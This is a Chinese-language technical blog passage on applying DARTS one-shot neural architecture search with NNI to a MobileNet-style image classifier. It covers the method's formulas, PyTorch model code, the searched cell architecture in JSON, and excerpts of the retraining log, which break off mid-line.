<h2 id="One-Shot-NAS"><a href="#One-Shot-NAS" class="headerlink" title="One-Shot NAS"></a>One-Shot NAS</h2><p>上一步的经典NAS算法对原始模型的改动较小，也得不到较大的优化效果。并且，在6层可选跳过的情况下，神经网络的深度会下降，挖掘深层特征的潜力也会有所降低，所以最后准确率不仅没有升高，反而效果不尽人意。</p>
<p>在这一步，我们尝试One-Shot NAS，通过定义DARTS的搜索空间，大幅度改变原有模型，尝试真正意义上提高预测的精确度至97%以上。</p>
<h3 id="DARTS原理简要分析"><a href="#DARTS原理简要分析" class="headerlink" title="DARTS原理简要分析"></a>DARTS原理简要分析</h3><p>DARTS全称Differentiable Architecture Search，是NAS领域中著名的算法之一。该算法的特色是将若干个待搜索的架构从互不关联的“黑箱优化”问题变成可松弛的连续优化问题，通过梯度下降来进行更新。</p>
<p>由于需求只是构造MobileNet的搜索空间，这里只对CNN的DARTS进行分析。</p>
<p>首先，如果将一个状态看作一个节点，把一种操作看作一条边，那么CNN的网络模型就可以抽象成一个有向无环图（DAG）。</p>
<p>而在我们进行搜索的过程中，两点之间其实包含有“重边”。这些“重边”虽然两端节点相同，但各代表着不同的操作。我们需要做的，就是在这些待选边中找出整体最适合的一条边来成为DAG的一部分，实现架构的搜索。</p>
<p>我们首先给cell下定义。一个cell是一个包含了$N$个节点的有向无环图。其中编号为$i$的节点$x^{(i)}$代表着特征所存在着的状态，而从$i$到$j$的一条有向边就代表着一种操作，这种操作记为$o^{(i,j)}$。</p>
<p>接下来定义cell的输入与输出。一个cell会有两个输入，而只会有一个输出。这个cell的输出是将所有前面节点的操作concat起来的结果。用公式写出来就是：</p>
<script type="math/tex; mode=display">x^{(j)} = \int_{i<j} o^{(i, j)}(x^{(i)})</script><p>这里$o^{(i,j)}(x)$代表着将$x$所代表的状态经过$(i,j)$这条有向边所代表的操作后所得到的新状态。正如直观感觉一般，也就是可以抽象成一个函数。</p>
<p>一条边所代表的，可以是一个池化层，可以是标准的Conv+BatchNorm组合，也可以是SkipConnect等其他的子模型。</p>
<p>定义的这些模型只需要满足一个共性：需要满足原数据的width和height不能改变。也就是类似于：</p>
<p>当卷积核size为3x3时，padding为1；当kernal size为5x5时，padding为2；当kernal size为1x1时，padding为0…</p>
<p>接下来令$x^{(i)}$和$x^{(j)}$这两点之间的$n$条所有候选边的集合为$\mathcal{O}$，$\alpha_o^{(i,j)}$是一个$n$维的向量，分别代表着每一个待选操作的得分。将这些得分进行softmax运算进行松弛，公式如下：</p>
<script type="math/tex; mode=display">\overline o^{(i,j)}(x) = \sum_{o\in \mathcal{O}}\frac{\exp(\alpha_o^{(i,j)})}{\sum_{o'\in \mathcal{O}} \exp(\alpha_{o'}^{(i,j)})}o(x)</script><p>$\overline o^{(i,j)}(x)$最终最可能会选中得分最高的架构，即：</p>
<script type="math/tex; mode=display">o^{(i,j)}=\argmax_{o\in \mathcal{O}}\alpha_o^{(i,j)}</script><p>最终我们所求的是集合$\alpha=\{\alpha^{(i,j)}\}$。</p>
<p>如何求得$\alpha$？我们需要训练集和验证集的协助。</p>
<p>设训练集和验证集的loss分别为$\mathcal{L}_{train}$和$\mathcal{L}_{val}$。我们要求$\alpha$，最理想的状况是存在最优架构$\alpha^\star$, 能够使得$\mathcal L_{val}(w^\star, \alpha^\star)$达到最小。而最优参数$w^\star$是通过训练集不断地训练出来的。也就是$w^\star= \argmin _w \mathcal{L}_{train}(w, \alpha^\star)$。</p>
<p>这样就需要解决一个双优化问题：</p>
<script type="math/tex; mode=display">\begin{aligned}
    & \min_\alpha \mathcal L_{val}(w^*, \alpha^*) \\
    &s. t. \quad w^*=\argmin_w \mathcal L_{train}(w, \alpha^*)
\end{aligned}</script><p>求解这个双优化问题的算法大体的思路是：固定架构参数，用训练数据集训练模型参数，再固定模型参数，用验证数据集训练架构参数。</p>
<p>DARTS算法将动辄耗费上千个GPU天的神经网络架构搜索缩短至1至4个GPU天，使得NAS应用的门槛和成本大幅度降低。</p>
<h2 id="代码实现部分"><a href="#代码实现部分" class="headerlink" title="代码实现部分"></a>代码实现部分</h2><p>由于NNI中对DARTS的基本单位cell做了封装，候选边已经包含了常见的SepConv3x3、SepConv5x5、DilConv3x3、DivConv5x5、平均池化层、最大池化层、跳过连接层等候选架构，可以通过调用<code>nni.nas.pytorch.search_space_zoo.DartsCell</code>直接使用默认cell结构。</p>
<p>最终待搜索的模型可以基于<code>DartsCell</code>来构造：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DartsStackedCells</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">drop_path_probability</span>(<span class="params">self, p</span>):</span></span><br><span class="line">        <span class="keyword">for</span> module <span class="keyword">in</span> self.modules():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(module, DropPath):</span><br><span class="line">                module.p = p</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_channels, channels, n_classes, n_layers, n_nodes=<span class="number">4</span>, stem_multiplier=<span class="number">2</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DartsStackedCells, self).__init__()</span><br><span class="line">        self.in_channels = in_channels</span><br><span class="line">        self.channels = channels</span><br><span class="line">        self.n_classes = n_classes</span><br><span class="line">        self.n_layers = n_layers</span><br><span class="line">        cur_channels = stem_multiplier * self.channels</span><br><span class="line">        self.stem = nn.Sequential(</span><br><span class="line">            nn.Conv2d(in_channels, cur_channels, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=<span class="literal">False</span>),</span><br><span class="line">            nn.BatchNorm2d(cur_channels)</span><br><span class="line">        )</span><br><span class="line">        pp_channels, p_channels, cur_channels = cur_channels, cur_channels, channels</span><br><span class="line">        self.cells = nn.ModuleList()</span><br><span class="line">        p_reduction, cur_reduction = <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_layers):</span><br><span class="line">            p_reduction, cur_reduction = cur_reduction, <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> [n_layers // <span class="number">3</span>, <span class="number">2</span> * n_layers // <span class="number">3</span>]:</span><br><span class="line">                cur_channels *= <span class="number">2</span></span><br><span class="line">                cur_reduction = <span class="literal">True</span></span><br><span class="line">            self.cells.append(DartsCell(n_nodes, pp_channels, p_channels, cur_channels, p_reduction, cur_reduction))</span><br><span class="line">            cur_channels_out = cur_channels * n_nodes</span><br><span class="line">            pp_channels, p_channels = p_channels, cur_channels_out</span><br><span class="line">        self.gap = nn.AdaptiveAvgPool2d(<span class="number">1</span>)</span><br><span class="line">        self.linear = nn.Linear(p_channels, n_classes)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        s0 = s1 = self.stem(x)</span><br><span class="line">        <span class="keyword">for</span> cell <span class="keyword">in</span> self.cells:</span><br><span class="line">            s0, s1 = s1, cell(s0, s1)</span><br><span class="line">        output = self.gap(s1)</span><br><span class="line">        output = output.view(output.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        output = self.linear(output)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终搜索出的结构如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;normal_n2_p0&quot;</span>: <span class="string">&quot;sepconv5x5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n2_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n2_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n2_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n2_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n3_p0&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n3_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n3_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n3_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n3_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n3_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n4_p0&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n4_p1&quot;</span>: <span class="string">&quot;sepconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n4_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n4_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n4_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n4_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n4_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p0&quot;</span>: <span class="string">&quot;dilconv3x3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n5_p1&quot;</span>: <span class="string">&quot;dilconv5x5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;normal_n5_p2&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_p4&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;normal_n5_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;normal_n5_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;normal_n5_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n2_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n2_p1&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n2_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n2_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n2_p1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n3_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n3_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n3_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n3_p2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p0&quot;</span>: <span class="string">&quot;maxpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n4_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n4_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n4_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n4_p2&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p0&quot;</span>: <span class="string">&quot;avgpool&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p1&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p2&quot;</span>: <span class="string">&quot;skipconnect&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p3&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_p4&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;reduce_n5_switch&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;reduce_n5_p0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reduce_n5_p2&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>retrain日志如下（仅截取第453个epoch和最后两个epoch）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[2021-02-22 16:16:01] INFO (nni&#x2F;MainThread) Epoch 453 LR 0.003524</span><br><span class="line">[2021-02-22 16:16:02] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 000&#x2F;520 Loss 0.146 Prec@(1,5) (94.8%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 010&#x2F;520 Loss 0.142 Prec@(1,5) (96.5%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:07] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 020&#x2F;520 Loss 0.151 Prec@(1,5) (96.5%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:10] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 030&#x2F;520 Loss 0.137 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:13] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 040&#x2F;520 Loss 0.147 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:15] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 050&#x2F;520 Loss 0.146 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:18] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 060&#x2F;520 Loss 0.144 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:21] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 070&#x2F;520 Loss 0.145 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 080&#x2F;520 Loss 0.144 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:26] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 090&#x2F;520 Loss 0.143 Prec@(1,5) (96.9%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:29] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 100&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:31] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 110&#x2F;520 Loss 0.139 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:34] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 120&#x2F;520 Loss 0.139 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:37] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 130&#x2F;520 Loss 0.138 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:40] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 140&#x2F;520 Loss 0.140 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:42] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 150&#x2F;520 Loss 0.139 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:45] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 160&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:48] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 170&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:50] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 180&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:53] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 190&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:56] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 200&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:16:59] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 210&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:01] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 220&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 230&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:07] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 240&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:09] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 250&#x2F;520 Loss 0.141 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:12] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 260&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:15] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 270&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:17] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 280&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:20] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 290&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 300&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:26] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 310&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:28] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 320&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:31] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 330&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:34] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 340&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:36] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 350&#x2F;520 Loss 0.140 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:39] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 360&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:42] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 370&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:45] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 380&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:47] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 390&#x2F;520 Loss 0.142 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:50] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 400&#x2F;520 Loss 0.143 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:53] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 410&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:55] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 420&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:17:58] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 430&#x2F;520 Loss 0.141 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:01] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 440&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:04] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 450&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:06] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 460&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:09] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 470&#x2F;520 Loss 0.144 Prec@(1,5) (97.0%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:12] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 480&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:14] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 490&#x2F;520 Loss 0.142 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:17] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 500&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:20] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 510&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Step 520&#x2F;520 Loss 0.143 Prec@(1,5) (97.1%, 100.0%)</span><br><span class="line">[2021-02-22 16:18:23] INFO (nni&#x2F;MainThread) Train: [454&#x2F;600] Final Prec@1 97.0640%</span><br><span class="line">...</span><br><span class="line">[2021-02-22 21:37:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 000&#x2F;520 Loss 0.054 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:05] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 010&#x2F;520 Loss 0.060 Prec@(1,5) (99.1%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 020&#x2F;520 Loss 0.058 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:10] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 030&#x2F;520 Loss 0.054 Prec@(1,5) (99.1%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:12] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 040&#x2F;520 Loss 0.059 Prec@(1,5) (98.9%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:15] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 050&#x2F;520 Loss 0.058 Prec@(1,5) (99.0%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:17] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 060&#x2F;520 Loss 0.064 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:20] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 070&#x2F;520 Loss 0.066 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:22] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 080&#x2F;520 Loss 0.068 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:24] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 090&#x2F;520 Loss 0.067 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:27] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 100&#x2F;520 Loss 0.069 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:29] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 110&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:32] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 120&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:34] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 130&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:37] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 140&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:39] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 150&#x2F;520 Loss 0.070 Prec@(1,5) (98.8%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:41] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 160&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:44] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 170&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:46] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 180&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:49] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 190&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:51] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 200&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:53] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 210&#x2F;520 Loss 0.072 Prec@(1,5) (98.6%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:56] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 220&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:37:58] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 230&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:01] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 240&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:03] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 250&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:06] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 260&#x2F;520 Loss 0.072 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:08] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 270&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:10] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 280&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:13] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 290&#x2F;520 Loss 0.071 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:15] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 300&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:18] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 310&#x2F;520 Loss 0.069 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:20] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 320&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:22] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 330&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:25] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 340&#x2F;520 Loss 0.069 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:27] INFO (nni&#x2F;MainThread) Train: [599&#x2F;600] Step 350&#x2F;520 Loss 0.070 Prec@(1,5) (98.7%, 100.0%)</span><br><span class="line">[2021-02-22 21:38:30] INFO (nni&#x2F;MainThread) Train: 